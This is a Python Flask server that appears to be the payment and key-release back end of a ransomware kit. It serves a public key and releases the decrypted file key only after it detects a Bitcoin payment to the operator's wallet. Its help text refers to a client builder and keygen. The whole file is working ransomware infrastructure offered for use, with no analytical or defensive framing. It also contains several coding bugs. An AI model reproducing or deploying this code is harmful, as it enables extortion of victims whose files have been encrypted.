from flask import Flask, request
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
import sys, getpass
from libs.bitcoin import get_transaction

app = Flask(__name__)

def check_payment(btc_address, ammount):
    newammount = ammount-5 #its a crypto it fluctuates and im accounting for if it dropped a max of 5 bucks between the time we check and it was sent
    transaction_ammnt = get_transaction(btc_address, wallet)

    if transaction_ammnt != None & transaction_ammnt >= newammount:
        return True
    else:
        return False


@app.route("/public.key", methods=["GET"])
def getpubkey():
    with open("keys/public.key", "rb") as f:
        data = f.read()
    return data, 200, {"Content-Type": "application/octet-stream"}

@app.route("/decrypt", methods=["POST"])
def decrypt():
    data = request.get_json()

    encsymkey = request["encsymkey"]
    btc_address = request["btc_address"]
    ammount = request["ammount"]

    with open("keys/private.key") as f:
        if password != "":
            privatekey = serialization.load_pem_private_key(f.read(), password=password)
        else:
            privatekey = serialization.load_pem_private_key(f.read())

    if check_payment(btc_address, ammount):
        returndata = privatekey.decrypt(
            encsymkey,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        return returndata, 200, {"Content-Type": "application/octet-stream"}
    else:
        returndata = "Bitcoin transaction not detected!".encode(), 200, {"Content-Type": "text/plain"}

argnum = 1
password = ""
port = 8080
wallet = ""
while True:
    if len(sys.argv) < argnum+1:
        app.run(host="0.0.0.0", port=port)
        break
    else:
        match sys.argv[argnum]:
            case "-h":
                print("\nUSAGE: python3 ./server.py -w jlkdfjlskhdf [-p] [-kp]\n\n" \
                "ARGS:\n\n" \
                "-w jksdflkhsd : your wallet address to check the payment for (NESSICARY)"
                "-p [port] : port for web server to run on (USE IF YOU DID A CUSTOM PORT WITH CLIENT BUILDER)\n" \
                "-kp : prompt for password (USE IF YOU RAN KEYGEN WITH A PASSWORD)")
                sys.exit()
            case "-w":
                argnum += 1
                if len(sys.argv) < argnum+1 or sys.argv[argnum].startswith("-"):
                    print("Invalid bitcoin address (argument doesn't exist)")
                else:
                    wallet = sys.argv[argnum]
                argnum += 1
            case "-p":
                argnum += 1
                if len(sys.argv) < argnum+1 or sys.argv[argnum].startswith("-") or not sys.argv[argnum].isdigit():
                    print("invalid port argument (either is not an integer or argument is missing)")
                    sys.exit()
                else:
                    port = int(sys.argv[argnum])
                argnum += 1
            case "-kp":
                argnum += 1
                while True:
                    passinput = getpass.getpass("Enter key password: ")
                    confpasswd = getpass.getpass("Confirm password: ")
                    if passinput != confpasswd:
                        print("Passwords do not match\n")
                        continue
                    password = passinput
                    break
            case _:
                print("invalid argument {sys.argv[argnum]}, breaking.")
                sys.exit()